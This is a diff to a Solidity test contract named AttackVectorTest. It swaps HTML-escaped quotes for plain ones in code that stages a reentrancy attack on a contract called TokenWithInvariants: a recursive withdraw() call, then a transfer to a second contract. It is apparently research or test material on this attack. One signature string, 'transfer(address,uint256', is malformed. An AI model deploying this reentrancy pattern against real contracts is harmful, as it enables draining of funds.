@@ -31,7 +31,7 @@ contract AttackVectorTest {
     }
     
     function depositToTWI(uint value) payable public {
-        _contraddr.call.value(msg.value)(bytes4(keccak256(&quot;deposit(uint256)&quot;)), value);
+        _contraddr.call.value(msg.value)(bytes4(keccak256("deposit(uint256)")), value);
         
     }
     
@@ -42,7 +42,7 @@ contract AttackVectorTest {
     }
     
     function withdraw() public {
-        _contraddr.call(bytes4(keccak256(&quot;withdraw()&quot;)));
+        _contraddr.call(bytes4(keccak256("withdraw()")));
     }
     
     function killswitch() public {
@@ -56,13 +56,13 @@ contract AttackVectorTest {
                 in_count = 1;
                 last_received = msg.value;
                 // recursively call withdraw on TokenWithInvariants
-                _contraddr.call(bytes4(keccak256(&quot;withdraw()&quot;))); 
+                _contraddr.call(bytes4(keccak256("withdraw()"))); 
             }
             else{
                 // reset
                 in_count = 0;
                 // call transfer on TWI to contract B
-                _contraddr.call(bytes4(keccak256(&quot;transfer(address,uint256&quot;)), _contractB, last_received);
+                _contraddr.call(bytes4(keccak256("transfer(address,uint256")), _contractB, last_received);
             }
         }
     }
